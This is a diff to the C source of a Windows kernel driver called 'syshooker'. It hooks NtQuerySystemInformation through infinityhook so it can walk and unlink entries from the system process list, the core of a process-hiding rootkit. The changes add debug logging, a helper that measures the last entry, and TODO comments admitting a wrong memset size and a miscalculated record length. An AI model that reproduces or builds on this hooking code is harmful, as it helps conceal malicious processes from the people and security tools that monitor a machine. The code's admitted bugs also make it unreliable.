@@ -41,6 +41,17 @@ typedef NTSTATUS(*NtQuerySystemInformation_t)(
 static UNICODE_STRING StringNtQuerySystemInformation = RTL_CONSTANT_STRING(L"NtQuerySystemInformation");
 static NtQuerySystemInformation_t OriginalNtQuerySystemInformation = NULL;
 
+ULONG GetLastEntrySize(ULONG ReturnLength, SYSTEM_PROCESS_INFORMATION* CurrentEntry) {
+	ULONG AllEntriesSum = 0;
+	while (CurrentEntry->NextEntryOffset != 0) {
+		AllEntriesSum += CurrentEntry->NextEntryOffset;
+		CurrentEntry = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)CurrentEntry + CurrentEntry->NextEntryOffset); // move forward
+	}
+	ULONG LastEntrySize = ReturnLength - AllEntriesSum;
+	kprintf("[+] syshooker: AllEntriesSum %d, LastEntrySize %d\n", AllEntriesSum, LastEntrySize);
+	return LastEntrySize;
+}
+
 NTSTATUS DetourNtQuerySystemInformation(
 	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
 	_Out_ PVOID SystemInformation,
@@ -51,16 +62,18 @@ NTSTATUS DetourNtQuerySystemInformation(
 	
 	if (NT_SUCCESS(OriginalStatus) && SystemInformationClass == SYSHOOKER_SYSTEM_INFORMATION_CLASS_PROCESS) {		
 		kprintf("[+] infinityhook: NtQuerySystemInformation: SystemInformationClass: %d\n", SystemInformationClass);
+		kprintf("[+] infinityhook: NtQuerySystemInformation: returnLength: %d\n", *ReturnLength);
 
         SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
 		SYSTEM_PROCESS_INFORMATION* PreviousProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
 
         if (ProcessInformationPtr) {
+			LONG LastEntrySize = GetLastEntrySize(*ReturnLength, ProcessInformationPtr);
             while (1) {
                 //kprintf("[+] infinityhook: NtQuerySystemInformation: PID: %d\n", ProcessInformationPtr->UniqueProcessId);
                 WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
                 wcsncpy(ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER-1)); // -1 to ensure that the last char is \0
-                //kprintf("[+] infinityhook: NtQuerySystemInformation: Process Name: %ws\n", ProcessNameBuffer);
+                kprintf("[+] infinityhook: NtQuerySystemInformation: Process Name: %ws, NextEntryOffset: %d, struct size: %d\n", ProcessNameBuffer, ProcessInformationPtr->NextEntryOffset, sizeof(SYSTEM_PROCESS_INFORMATION));
 
 				//if (wcsstr(ProcessNameBuffer, Settings.NtQuerySystemInformationProcessMagicName)) {
 					//kprintf("[+] infinityhook: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
@@ -82,7 +95,7 @@ NTSTATUS DetourNtQuerySystemInformation(
 							TempProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)TempProcessInformationPtr + TempProcessInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
 						}
 						// last record size
-						ProcessInformationBufferSizeToEnd += sizeof(SYSTEM_PROCESS_INFORMATION);
+						ProcessInformationBufferSizeToEnd += sizeof(SYSTEM_PROCESS_INFORMATION); // TODO - fix - add last name length
 
 						// next structure address - start copying from there
 						SYSTEM_PROCESS_INFORMATION* NextProcessInformationStructAddr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset);
@@ -94,9 +107,12 @@ NTSTATUS DetourNtQuerySystemInformation(
 
 					// Last one
 					else {
+						kprintf("[-] syshooker: do we ever hit this?");
 						// set previous NextEntryOffset to 0
 						PreviousProcessInformationPtr->NextEntryOffset = 0;
 
+						// TODO - should not be FILE_DIRECTORY_INFORMATION here - fix!!!
+						// length should be PROBABLY be sizeof(SYSTEM_PROCESS_INFORMATION) + NameLength * sizeof(wchar)
 						// erease this FileInformation structure
 						memset(ProcessInformationPtr, 0, sizeof(FILE_DIRECTORY_INFORMATION));
 						break;
